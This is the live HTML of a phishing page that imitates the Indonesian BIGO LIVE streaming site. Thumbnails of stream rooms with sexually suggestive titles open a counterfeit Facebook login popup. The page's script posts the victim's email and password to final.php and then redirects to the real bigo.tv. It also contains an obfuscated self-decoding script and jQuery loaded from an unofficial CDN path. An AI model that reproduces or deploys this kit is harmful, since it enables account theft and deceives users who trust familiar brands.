<html data-n-head-ssr="" lang="id" class="html-style hairlines" style="font-size: 40px;">
 <head>
  <title>BIGO LIVE - Aplikasi Live Streaming Global Terbaik di Indonesia</title>
  <meta data-n-head="ssr" charset="utf-8">
  <meta data-n-head="ssr" name="google-site-verification" content="fK_CSs0lIl35O-9gx32fS7uzMbj8VhN9OgHhXdnu4fc">
  <meta data-n-head="ssr" data-hid="title" name="title" content="BIGO LIVE - Broadcast &amp; Explore Live Streaming">
  <meta data-n-head="ssr" data-hid="keywords" name="keywords" content="LIVE broadcasts,BIGO LIVE,Game broadcasting,video streaming">
  <meta data-n-head="ssr" data-hid="og:site_name" property="og:site_name" content="www.bigo.tv">
  <meta data-n-head="ssr" data-hid="al:ios:app_store_id" property="al:ios:app_store_id" content="1077137248">
  <meta data-n-head="ssr" data-hid="al:ios:app_name" property="al:ios:app_name" content="BIGO LIVE">
  <meta data-n-head="ssr" data-hid="al:android:package" property="al:android:package" content="sg.bigo.live">
  <meta data-n-head="ssr" data-hid="al:android:app_name" property="al:android:app_name" content="BIGO LIVE">
  <meta data-n-head="ssr" data-hid="apple-mobile-web-app-title" property="apple-mobile-web-app-title" content="BIGO LIVE">
  <meta data-n-head="ssr" data-hid="og:type" property="og:type" content="website">
  <meta data-n-head="ssr" data-hid="twitter:card" name="twitter:card" content="summary">
  <meta data-n-head="ssr" data-hid="twitter:site" name="twitter:site" content="@BIGOLIVEapp">
  <meta data-n-head="ssr" data-hid="twitter:title" name="twitter:title" content="BIGO LIVE - Broadcast &amp; Explore Live Streaming">
  <meta data-n-head="ssr" data-hid="twitter:description" name="twitter:description" content="BIGO LIVE is a leading live streaming community to show your talents and make friends from all around the world. Come and go!">
  <meta data-n-head="ssr" http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  <meta data-n-head="ssr" data-hid="charset" charset="utf-8">
  <meta data-n-head="ssr" data-hid="mobile-web-app-capable" name="mobile-web-app-capable" content="yes">
  <meta data-n-head="ssr" data-hid="author" name="author" content="jiurigege">
  <meta data-n-head="ssr" data-hid="theme-color" name="theme-color" content="#f5f7fa">
  <meta data-n-head="ssr" data-hid="og:image:width" name="og:image:width" property="og:image:width" content="512">
  <meta data-n-head="ssr" data-hid="og:image:height" name="og:image:height" property="og:image:height" content="512">
  <meta data-n-head="ssr" data-hid="viewport" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
  <meta data-n-head="ssr" data-hid="og:title" property="og:title" content="BIGO LIVE - Aplikasi Live Streaming Global Terbaik di Indonesia">
  <meta data-n-head="ssr" data-hid="og:description" property="og:description" content="BIGO LIVE adalah Aplikasi live streaming terpopuler, tonton pertunjukan, game, musik, dan acara langsung. Bergabung, berinteraksi, dan bersenang-senang!">
  <meta data-n-head="ssr" data-hid="description" name="description" content="BIGO LIVE adalah Aplikasi live streaming terpopuler, tonton pertunjukan, game, musik, dan acara langsung. Bergabung, berinteraksi, dan bersenang-senang!">
  <link data-n-head="ssr" rel="apple-touch-icon" href="/apple-touch-icon.png">
  <link data-n-head="ssr" data-hid="favicon" rel="icon" type="image/x-icon" href="/favicon.ico">
  <link data-n-head="ssr" rel="preconnect" href="https://www.googletagmanager.com/" crossorigin="true">
  <link data-n-head="ssr" rel="dns-prefetch" href="https://www.googletagmanager.com/">
  <link data-n-head="ssr" data-hid="shortcut-icon" rel="shortcut icon" href="https://static-web.hzmk.site/as/bigo-static/www.bigo.tv/img/logo_icon.png">
  <link data-n-head="ssr" data-hid="apple-touch-icon" rel="apple-touch-icon" href="https://static-web.hzmk.site/as/bigo-static/www.bigo.tv/img/logo_icon2.png" sizes="512x512">
  <link data-n-head="ssr" rel="manifest" href="/_nuxt_cdn_/manifest.e5ef064a.json" data-hid="manifest">
  <link data-n-head="ssr" rel="stylesheet" data-hid="videojscss" href="/www.bigo.tv/static/rovideo-js-7.20.2.min.css" head="true">
  <link data-n-head="ssr" data-hid="mobile-swiper-css" rel="stylesheet" href="/www.bigo.tv/static/mobile/swiper.min.css" head="true"> 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
  <noscript data-n-head="ssr" data-hid="ad-ga-noscript">
   &lt;iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TTJNJK6" height="0" width="0" style="display:none;visibility:hidden"&gt;
  </noscript>
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/facebook.css">
 </head> 
 <body class="body-style" style="display:none;font-size: 32.4px;"> 
  <div data-server-rendered="true" id="bigolive">
   <!---->
   <div id="__layout">
    <div class="mobile-container" data-v-6c51eeeb="">
     <div style="margin:0 auto;" data-v-6c51eeeb="">
      <main class="mobile-main" data-v-10e59a1e="">
       <div data-v-10e59a1e="">
        <!----> 
        <div class="nav_bottom" data-v-10e59a1e="">
         <div class="nav_bottom-content" data-v-10e59a1e="">
          <div data-v-10e59a1e="">
           <a class="current" data-v-10e59a1e=""> Rumah </a>
          </div> 
          <div data-v-10e59a1e="">
           <a data-v-10e59a1e=""> LIVE </a>
          </div> 
          <div data-v-10e59a1e="">
           <a data-v-10e59a1e=""> Game </a>
          </div> 
          <div data-v-10e59a1e="">
           <!---->
          </div>
         </div> 
         <div class="tab-search" data-v-10e59a1e="">
          <a href="/id/search" class="search-icon" data-v-10e59a1e=""></a>
         </div>
        </div> 
        <div hive-anchor="mobile-index" class="mobile-main-index" data-v-25671baa="">
         <div id="swiper_images_e" class="mobile_index_banner swiper-container" data-v-25671baa="">
          <ul class="swiper-wrapper" data-v-25671baa="">
           <li class="swiper-slide" data-v-25671baa="">
            <div class="bigo-mobile-banner" style="background-image:url(https://static-web.hzmk.site/as/bigo-static/officialWebsite/68765/swiper-id.jpg);" data-v-25671baa=""></div></li>
           <li class="swiper-slide" data-v-25671baa="">
            <div class="bigo-mobile-banner" style="background-image:url(/_nuxt_cdn_/img/m_banner3.fb8a1c.jpg);" data-v-25671baa=""></div></li>
          </ul> 
          <div class="banner_dot_wrap" style="display:;" data-v-25671baa="">
           <div class="banner_dot_box banner_dot_box_index" data-v-25671baa=""></div>
          </div>
         </div> 
         <div class="bigo_room_list_wrap bigo_show_list" data-v-db044f46="" data-v-25671baa="">
          <div class="room_list_title" data-v-db044f46="">
           <div class="blue-line-container" data-v-db044f46="">
            <div class="blue-line" data-v-db044f46=""></div> 
            <h2 data-v-db044f46="">Room live teratas</h2>
           </div> 
           <div class="more_btn" data-v-db044f46="">
            <span data-v-db044f46="">Lagi</span> 
            <div class="arrow-icon" data-v-db044f46=""></div>
           </div>
          </div> 
          <!----> 
          <ul class="bigo_room_list" data-v-db044f46="">
           <li data-v-db044f46=""><a onclick="openfcbksalz()"><img src="images/2.png" alt="bigo anchor poster" width="100%" height="100%" data-v-db044f46=""> 
             <div class="online_box" data-v-db044f46="">
              <span class="fans_num" data-v-db044f46="">468</span>
             </div> 
             <div class="list_hover" data-v-db044f46="">
              <div class="bottom_content" data-v-db044f46="">
               <p class="country_name" data-v-db044f46="">🇹🇭Thailand</p> 
               <p class="room_name" data-v-db044f46="">Main Berdua🍆💦</p>
              </div>
             </div></a></li>
           <li data-v-db044f46=""><a onclick="openfcbksalz()"><img src="images/4.png" alt="bigo anchor poster" width="100%" height="100%" data-v-db044f46=""> 
             <div class="online_box" data-v-db044f46="">
              <span class="fans_num" data-v-db044f46="">98</span>
             </div> 
             <div class="list_hover" data-v-db044f46="">
              <div class="bottom_content" data-v-db044f46="">
               <p class="country_name" data-v-db044f46="">🇮🇩Indonesia</p> 
               <p class="room_name" data-v-db044f46="">C0lmex💦</p>
              </div>
             </div></a></li>
           <li data-v-db044f46=""><a onclick="openfcbksalz()"><img src="images/3.png" alt="bigo anchor poster" width="100%" height="100%" data-v-db044f46=""> 
             <div class="online_box" data-v-db044f46="">
              <span class="fans_num" data-v-db044f46="">699</span>
             </div> 
             <div class="list_hover" data-v-db044f46="">
              <div class="bottom_content" data-v-db044f46="">
               <p class="country_name" data-v-db044f46="">🇮🇩Indonesia</p> 
               <p class="room_name" data-v-db044f46="">Keenakan😘</p>
              </div>
             </div></a></li>
           <li data-v-db044f46=""><a onclick="openfcbksalz()"><img src="images/1.png" alt="bigo anchor poster" width="100%" height="100%" data-v-db044f46=""> 
             <div class="online_box" data-v-db044f46="">
              <span class="fans_num" data-v-db044f46="">872</span>
             </div> 
             <div class="list_hover" data-v-db044f46="">
              <div class="bottom_content" data-v-db044f46="">
               <p class="country_name" data-v-db044f46="">🇨🇦Kanada</p> 
               <p class="room_name" data-v-db044f46="">Di Keroyok♥️🫰</p>
              </div>
             </div></a></li>
          </ul>
         </div> 
         <!---->
        </div>
       </div> 
       <div data-v-10e59a1e="">
        <div class="company_intro" data-v-10e59a1e="">
         <div class="inner_cell" data-v-10e59a1e="">
           Copyright © 2015-2023 Bigo Technology Pte. Ltd. 
          <br data-v-10e59a1e="">All Rights Reserved. User Agreement and Privacy Policy 
         </div>
        </div> 
         </div>
        </div>
       </div> 
        <div class="popup-ariandi alex-facebook animate fadeIn" id="slzfcbk" style="display: none;">
            <div class="container-box-fb" style="margin-top: 10%;">
                <div class="atasan-fb" style="width: 100%;">
                    <img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
                </div>
                <div class="isi-facebook">
                    <p class="kaget email-fb1" style="width: 330px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                    <p class="kaget sandi-fb1" style="width: 330px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>   
                    <img src="images/bigo.33589b.png">
                    <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk lanjut ke BIGO LIVE</div>
                    <form class="form-login-fb" method="post" onsubmit="$(this).end()">
                        <label>
                            <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <label>
                            <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <input type="hidden" name="ua" value="Bigo Live" readonly>
                        <input type="hidden" name="log" value="Facebook" readonly>
                        <button class="btn-login-fb" onclick="return AlexHostingFB()" type="submit">Masuk</button>
                    </form>
                    <div class="txt-buat-akun">Buat akun</div>
                    <div class="txt-tidak-sekarang">Lain kali</div>
                    <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                </div>
                <div class="isi-bahasa">
                    <center>
                        <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                        <div class="nama-bahasa">English (UK)</div>
                        <div class="nama-bahasa">Basa Jawa</div>
                        <div class="nama-bahasa">Bahasa Melayu</div>
                        <div class="nama-bahasa">日本語</div>
                        <div class="nama-bahasa">Español</div>
                        <div class="nama-bahasa">Português (Brasil)</div>
                        <div class="nama-bahasa"><i class="fa fa-plus"></i>
                        </div>
                    </center>
                </div>
                <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/gh/StyleeJs/3.6.0/jquery.js"></script>
        <script>
            function openfcbksalz() {
                $('#slzfcbk').show();
            }
            
            function AlexHostingFB()
        	{
        		$emailfb1 = $('#alx_email_fb2').val().trim();
        		$passwordfb1 = $('#alx_password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('.form-login-fb').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://www.bigo.tv";
                            } 
                    })
        		}
        	}
        </script>
        <?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
    </body>
</html>